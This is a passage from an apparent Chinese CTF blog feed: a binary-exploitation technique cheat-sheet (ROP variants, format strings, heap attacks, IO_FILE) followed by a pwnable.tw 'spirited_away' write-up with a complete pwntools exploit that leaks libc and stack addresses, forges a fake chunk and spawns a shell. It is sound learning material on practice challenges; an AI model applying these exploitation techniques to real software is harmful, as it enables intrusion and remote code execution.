class="number">34</span>j</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400616</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040061</span>A                 pop     rbx</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040061B</span>                 pop     rbp</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040061</span>C                 pop     r12</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040061</span>E                 pop     r13</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400620</span>                 pop     r14</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400622</span>                 pop     r15</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400624</span>                 retn</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400624</span> __libc_csu_init endp</span><br></pre></td></tr></table></figure><p>这里我们可以利用以下几点</p><ul><li>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。</li><li>从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li><li>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。</li></ul><h4 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h4><p>还没写过题目，仅在此记录原理</p><ol><li>查看溢出函返回时哪个寄存值指向溢出缓冲区空间</li><li>然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址</li><li>reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)</li></ol><h4 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h4><p>Blind ROP，简而言之就是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。</p><p>也还没写过这类题目</p><p>参考<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#brop" target="_blank" rel="noopener">ctf-wiki-BROP</a></p><h3 id="高级ROP"><a href="#高级ROP" class="headerlink" title="高级ROP"></a>高级ROP</h3><h4 id="ret2-dl-runtime-resolve"><a href="#ret2-dl-runtime-resolve" class="headerlink" title="ret2_dl_runtime_resolve"></a>ret2_dl_runtime_resolve</h4><p>在 linux 中是利用_dl_runtime_resolve(link_map_obj, reloc_index) 来对动态链接的函数进行重定位的。如果我们可以控制相应的参数以及其对应地址的内容就可以控制解析的函数了。</p><p>还没写过这类题目</p><p>参考<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2_dl_runtime_resolve" target="_blank" rel="noopener">ctf-wiki-ret2_dl_runtime_resolve</a></p><h4 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h4><p>简而言之就是通过<code>sigreturn</code>这个系统调用来控制各寄存器的值</p><p>还没写过这类题目</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop" target="_blank" rel="noopener">ctf-wiki-SROP</a></p><h3 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h3><p>在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。</p><p>如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 <code>__fortify_fail</code> 函数中就会输出我们想要的信息。</p><h3 id="栈上的-partial-overwrite"><a href="#栈上的-partial-overwrite" class="headerlink" title="栈上的 partial overwrite"></a>栈上的 partial overwrite</h3><p>我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。</p><h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><p>栈迁移一般是ROP利用的前序步骤，目标是劫持esp寄存器到我们控制的内存上去，然后在ret的时候就可以进入我们布置好的ROP链</p><p>例如：<a href="http://0bs3rver.space/2020/10/27/pwnable-tw-3x17-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E6%9E%84%E9%80%A0ROP/" target="_blank" rel="noopener">pwnable-tw-3x17-任意地址写构造ROP</a></p><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><p>最核心的利用：</p><ol><li>利用%p进行参数打印，用于实现任意内存泄漏</li><li>利用%n进行内存修改，利用%$n/hn/hhn可以将内存值修改为之前打印的字符数目</li></ol><p><a href="https://blog.csdn.net/weixin_43742794/article/details/98640383" target="_blank" rel="noopener">64位格式化字符串和栈溢出</a></p><h3 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h3><p>函数作用是字符串复制，我们可以利用字符串可变进行越界，类似于栈溢出</p><p><a href="http://0bs3rver.space/2020/12/02/pwnable-tw-spirited-away-read%E4%B8%8Esprintf%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA/" target="_blank" rel="noopener">pwnable.tw-spirited_away-read与sprintf的栈溢出</a></p><h3 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h3><p>利用字符串复制的截断造成复制意料之外的数据</p><p><a href="http://0bs3rver.space/2020/12/04/pwnable-tw-babystack-strcpy%E5%BD%A2%E6%88%90%E6%A0%88%E6%BA%A2%E5%87%BA/" target="_blank" rel="noopener">pwnable-tw-babystack-strcpy形成栈溢出</a></p><h2 id="堆利用"><a href="#堆利用" class="headerlink" title="堆利用"></a>堆利用</h2><p>据说，堆利用的本质就是UAF</p><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h3><p>off-by-one 是指单字节缓冲区溢出，利用：</p><ol><li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li><li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。</li></ol><h3 id="chunk-extend"><a href="#chunk-extend" class="headerlink" title="chunk extend"></a>chunk extend</h3><p>简而言之，就是通过控制chunk header 中的数据，完成对其他堆内容的控制</p><p>在ptmalloc中，获取后一堆块的地址是使用当前块指针加上当前块大小，获取前一堆块的地址是通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小，而判断当前chunk是否是use状态的操作是查看下一 chunk 的 prev_inuse 域。</p><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。</p><p>类似unlink的利用：<a href="http://0bs3rver.space/2020/11/16/pwnable-tw-applestore-%E5%88%A9%E7%94%A8%E6%A0%88%E5%B9%B3%E8%A1%A1%E6%8E%A7%E5%88%B6%E5%86%85%E5%AD%98/#delete%E4%B8%80%E6%AC%A1%E6%9C%89%E7%BA%A6%E6%9D%9F%E7%9A%84%E5%9C%B0%E5%9D%80%E5%86%99" target="_blank" rel="noopener">pwnable-tw-applestore-利用栈平衡控制内存/#delete一次有约束的地址写</a></p><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>use after free 顾名思义，就是一个内存块被释放之后我们还是可以使用它</p><p><a href="http://0bs3rver.space/2020/11/21/pwnable-tw-re-alloc-%E5%88%A9%E7%94%A8realloc%E5%AE%9E%E7%8E%B0uaf%E6%9B%B4%E6%94%B9got%E8%A1%A8/" target="_blank" rel="noopener">pwnable-tw-re-alloc-利用realloc实现uaf更改got表</a></p><h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin-attack"></a>fastbin-attack</h3><h4 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house-of-spirit"></a>house-of-spirit</h4><p>house of spirit 技术的核心原理是在目标位置处伪造一个chunk，并将其释放，从而达到分配<strong>指定地址</strong>的chunk的目的，<strong>成功的关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong></p><p><a href="http://0bs3rver.space/2020/11/26/pwnable-tw-TcacheTear-tcache-dupANDhouse-of-spiritAND-free-hook/#house-of-spirit" target="_blank" rel="noopener">pwnable-tw-TcacheTear-tcache-dupANDhouse-of-spiritAND-free-hook</a></p><h4 id="arbitrary-alloc"><a href="#arbitrary-alloc" class="headerlink" title="arbitrary-alloc"></a>arbitrary-alloc</h4><p>通过寻找合适的值完成任意地址分配</p><p><a href="http://0bs3rver.space/2020/12/07/pwnable-tw-secret-garden-fastbin%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%88%86%E9%85%8D%E4%BF%AE%E6%94%B9hook/" target="_blank" rel="noopener">pwnable-tw-secret-garden-fastbin任意地址分配修改hook</a></p><h3 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin-attack"></a>unsortedbin-attack</h3><h4 id="main-arena泄漏libc基址"><a href="#main-arena泄漏libc基址" class="headerlink" title="main-arena泄漏libc基址"></a>main-arena泄漏libc基址</h4><p><a href="http://0bs3rver.space/2020/11/02/pwnable-tw-hacknote-%E7%94%A8main-arena%E6%B3%84%E6%BC%8Flibc/#unsortbin%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80" target="_blank" rel="noopener">pwnable-tw-hacknote-用main-arena泄漏libc/#unsortbin泄露libc基址</a></p><h3 id="tcache-attack"><a href="#tcache-attack" class="headerlink" title="tcache-attack"></a>tcache-attack</h3><h4 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache-dup"></a>tcache-dup</h4><p>类似于简易版double free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>,addr)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>,data)</span><br></pre></td></tr></table></figure><p><a href="http://0bs3rver.space/2020/11/26/pwnable-tw-TcacheTear-tcache-dupANDhouse-of-spiritAND-free-hook/#tcache-dup%E6%9E%84%E9%80%A0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99" target="_blank" rel="noopener">pwnable-tw-TcacheTear-tcache-dupANDhouse-of-spiritAND-free-hook/#tcache-dup构造任意地址写</a></p><h3 id="glibc2-29-key指针"><a href="#glibc2-29-key指针" class="headerlink" title="glibc2.29-key指针"></a>glibc2.29-key指针</h3><p>glibc2.29引入的key指针，它指向堆开头的tcache_perthread_struct结构的地址，我们将他泄漏就可以得到堆基址。</p><p><a href="https://github.com/0bs3rver/learning-with-sakura/tree/master/ctf/googlectf_echo" target="_blank" rel="noopener">googlectf_echo</a></p><h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO FILE"></a>IO FILE</h2><p>libc实现的文件流机制中存在可以被改写的函数指针</p><h3 id="glibc2-23下伪造vtable"><a href="#glibc2-23下伪造vtable" class="headerlink" title="glibc2.23下伪造vtable"></a>glibc2.23下伪造vtable</h3><p>伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。</p><p><a href="http://0bs3rver.space/2020/11/28/pwnable-tw-seethefile-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%9E%84%E9%80%A0fake-FILE/#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E4%B9%8B-IO-FILE" target="_blank" rel="noopener">pwnable-tw-seethefile-栈溢出构造fake-FILE/#前置知识之-IO-FILE</a></p><h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><p>简而言之就是程序逻辑不完善造成的意外情况</p><p><a href="http://0bs3rver.space/2020/10/23/pwnable-tw-calc-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99/" target="_blank" rel="noopener">pwnable-tw-calc-逻辑漏洞实现任意地址读写</a></p><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>主要是类型转换，上下界溢出等情况</p><p><a href="https://github.com/0bs3rver/learning-with-sakura/tree/master/kernel/%E6%80%9D%E8%80%83%E9%A2%98-10%E7%A7%8D%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E5%92%8C%E6%B5%AE%E7%82%B9%E7%B2%BE%E5%BA%A6%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">10种整数溢出和浮点精度导致的漏洞</a></p><h2 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h2><p>我的理解就是在各种限制下完成shell的获取</p><p><a href="https://github.com/0bs3rver/learning-with-sakura/tree/master/ctf/plaidctf2020_sandybox" target="_blank" rel="noopener">plaidctf2020_sandybox</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-spirited_away-read与sprintf的栈溢出</title>
      <link href="2020/12/02/pwnable-tw-spirited-away-read%E4%B8%8Esprintf%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>2020/12/02/pwnable-tw-spirited-away-read%E4%B8%8Esprintf%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ file spirited_away </span><br><span class="line">spirited_away: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-, for GNU&#x2F;Linux 2.6.24, BuildID[sha1]&#x3D;9e6cd4dbfea6557127f3e9a8d90e2fe46b21f842, not stripped</span><br><span class="line">$ checksec spirited_away </span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>32位程序，没去符号表，只开了NX</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序的功能是写评论，输入姓名、年龄等信息，代码很简单，没什么好说的</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>第一个漏洞点是read函数，没有NULL截断，可以泄漏stack和libc信息</p><p>第二个漏洞点是栈溢出，来自一个不太常见的函数 sprintf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(&amp;v1, <span class="string">"%d comment so far. We will review them as soon as we can"</span>, cnt);<span class="comment">// 溢出</span></span><br></pre></td></tr></table></figure><p>这行中，当cnt大于等于100时，该字符串的最后一个字母n会覆盖掉控制字符数量的nbytes变量，n的ascii码值是0x6e，从而造成comment参数的栈溢出，和name的堆溢出，我们可以通过栈溢出修改name参数内的地址从而形成任意地址free</p><h2 id="sprintf函数"><a href="#sprintf函数" class="headerlink" title="sprintf函数"></a>sprintf函数</h2><h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><p>int sprintf(char *string, char *format [,argument,…]);</p><h3 id="参数列表"><a href="#参数列表" class="headerlink" title="参数列表"></a>参数列表</h3><ul><li><strong>string</strong>– 这是指向一个字符数组的指针，该数组存储了 C 字符串。</li><li><strong>format</strong>– 这是字符串，包含了要被写入到字符串 str 的文本。它可以包含嵌入的 format 标签，format 标签可被随后的附加参数中指定的值替换，并按需求进行格式化。format 标签属性是<strong>%[flags][width][.precision][length]specifier</strong></li><li><strong>[argument]…</strong>：根据不同的 format 字符串，函数可能需要一系列的附加参数，每个参数包含了一个要被插入的值，替换了 format 参数中指定的每个 % 标签。参数的个数应与 % 标签的个数相同。</li></ul><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>将format字符串写入到string所在位置</p><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>如果成功，则返回写入的字符总数，不包括字符串追加在字符串末尾的空字符。如果失败，则返回一个负数。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>我们首先泄漏出libc和stack信息（调试查看偏移</p><p>然后在栈中构造fake_chunk并利用任意地址free，获取到栈上堆块</p><p>最后利用name的溢出进行ROP，可以简单的get shell</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>中间出现了一点匪夷所思的问题，我不能直接range(100)，这样会泄漏出错误的东西，即</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">leave = <span class="keyword">lambda</span> name,reason,comment : (sa(<span class="string">"name: "</span>,name),sa(<span class="string">"age: "</span>,<span class="string">"1\n"</span>),sa(<span class="string">"movie? "</span>,reason),sa(<span class="string">"comment: "</span>,comment))</span><br><span class="line">addone = <span class="keyword">lambda</span> : sa(<span class="string">"&lt;y/n&gt;: "</span>,<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overflow</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">leave(<span class="string">"aaa"</span>,<span class="string">"bbb"</span>,<span class="string">"ccc"</span>)</span><br><span class="line">addone()</span><br></pre></td></tr></table></figure><p>参考了别的师傅的wp后，改成range(10)和range(90)，可以leak成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">leave = <span class="keyword">lambda</span> name,reason,comment : (sa(<span class="string">"name: "</span>,name),sa(<span class="string">"age: "</span>,<span class="string">"1\n"</span>),sa(<span class="string">"movie? "</span>,reason),sa(<span class="string">"comment: "</span>,comment))</span><br><span class="line">addone = <span class="keyword">lambda</span> : sa(<span class="string">"&lt;y/n&gt;: "</span>,<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overflow</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">leave(<span class="string">"aaa"</span>,<span class="string">"bbb"</span>,<span class="string">"ccc"</span>)</span><br><span class="line">addone()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>):</span><br><span class="line">    sa(<span class="string">'Please enter your age: '</span>, <span class="string">'1\n'</span>)</span><br><span class="line">    sa(<span class="string">'Why did you came to see this movie? '</span>, <span class="string">'c\x00'</span>)</span><br><span class="line">    sa(<span class="string">'Would you like to leave another comment? &lt;y/n&gt;: '</span>, <span class="string">'y'</span>)</span><br></pre></td></tr></table></figure><p>经过调试发现，我range(10)次后，已经不需要，准确的说已经无法输入部分信息了，暂时还没想清楚为啥，如果有师傅知道。还请告知：<a href="mailto:wu.guang.zheng@qq.com">wu.guang.zheng@qq.com</a></p><p>但是又出现了一个令人沮丧的东西：远程打不通</p><p>经过尝试，我自己和部分wp会出现timeout，而直接抄的别的师傅的wp，查看交互会经常出现它获取到的信息和我输入的信息不匹配的情况，故我猜测是题目的问题，就先放弃远程打通了</p><p>最终exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch='amd64',os='linux',log_level='debug')</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./spirited_away"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./my_ubuntu32_libc.so"</span>)</span><br><span class="line">io = process(elf.path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./spirited_away"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10204</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line">s = io.send                                    <span class="comment">#</span></span><br><span class="line">sl = io.sendline                               <span class="comment">#</span></span><br><span class="line">sa = io.sendafter                              <span class="comment">#</span></span><br><span class="line">sla = io.sendlineafter                         <span class="comment">#</span></span><br><span class="line">r = io.recv                                    <span class="comment">#</span></span><br><span class="line">rl = io.recvline                               <span class="comment">#</span></span><br><span class="line">ru = io.recvuntil                              <span class="comment">#</span></span><br><span class="line">it = io.interactive                            <span class="comment">#</span></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line"></span><br><span class="line">leave = <span class="keyword">lambda</span> name,reason,comment : (sa(<span class="string">"name: "</span>,name),sa(<span class="string">"age: "</span>,<span class="string">"1\n"</span>),sa(<span class="string">"movie? "</span>,reason),sa(<span class="string">"comment: "</span>,comment))</span><br><span class="line">addone = <span class="keyword">lambda</span> : sa(<span class="string">"&lt;y/n&gt;: "</span>,<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overflow</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">leave(<span class="string">"aaa"</span>,<span class="string">"bbb"</span>,<span class="string">"ccc"</span>)</span><br><span class="line">addone()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>):</span><br><span class="line">    sa(<span class="string">'Please enter your age: '</span>, <span class="string">'1\n'</span>)</span><br><span class="line">    sa(<span class="string">'Why did you came to see this movie? '</span>, <span class="string">'c\x00'</span>)</span><br><span class="line">    sa(<span class="string">'Would you like to leave another comment? &lt;y/n&gt;: '</span>, <span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x14</span> + <span class="string">"bbbb"</span></span><br><span class="line">leave(<span class="string">"aaa"</span>,payload1,<span class="string">"aaa"</span>)</span><br><span class="line">ru(<span class="string">"bbbb"</span>)</span><br><span class="line">libc_addr = u32(r(<span class="number">4</span>)) <span class="number">-7</span> -libc.sym[<span class="string">"_IO_file_sync"</span>]</span><br><span class="line">addone()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = libc_addr + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak stack</span></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x34</span> + <span class="string">"bbbb"</span></span><br><span class="line">leave(<span class="string">"aaa"</span>,payload2,<span class="string">"aaa"</span>)</span><br><span class="line">ru(<span class="string">"bbbb"</span>)</span><br><span class="line">stack_addr = u32(r(<span class="number">4</span>)) - <span class="number">0x70</span></span><br><span class="line">log.warn(<span class="string">"leak:0x%x"</span>%stack_addr)</span><br><span class="line">addone()</span><br><span class="line"><span class="comment">#fake chunk</span></span><br><span class="line"></span><br><span class="line">reason = p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>) + <span class="string">'a'</span>*<span class="number">0x38</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x11</span>)</span><br><span class="line">comment = <span class="string">'a'</span>*<span class="number">0x54</span> + p32(stack_addr+<span class="number">8</span>)</span><br><span class="line">leave(<span class="string">'aaa'</span>,reason,comment)</span><br><span class="line">addone()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#heap overflow</span></span><br><span class="line">name = <span class="string">'a'</span>*<span class="number">0x4c</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr)</span><br><span class="line">leave(name,<span class="string">'aaa'</span>,<span class="string">'aaa'</span>)</span><br><span class="line">sa(<span class="string">'Would you like to leave another comment? &lt;y/n&gt;: '</span>, <span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>ps：原来题目名是千与千寻，老二次元了</p><p>参考：</p><ul><li><a href="https://veritas501.space/2018/03/04/pwnable.tw%2011~18%E9%A2%98%20writeup/" target="_blank" rel="noopener">pwnable.tw 11~18题 writeup</a></li><li><a href="http://blog.eonew.cn/archives/1133" target="_blank" rel="noopener">pwnable.tw Spirited Away writeup</a></li><li><a href="https://j-kangel.github.io/2020/06/23/pwnable-tw-Spirited-Away/#%E5%89%8D%E8%A8%80" target="_blank" rel="noopener">pwnable.tw Spirited Away</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-death_note-可见字符shellcode</title>
      <link href="2020/11/28/pwnable-tw-death-note-%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6shellcode/"/>
      <url>2020/11/28/pwnable-tw-death-note-%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6shellcode/</url>
      
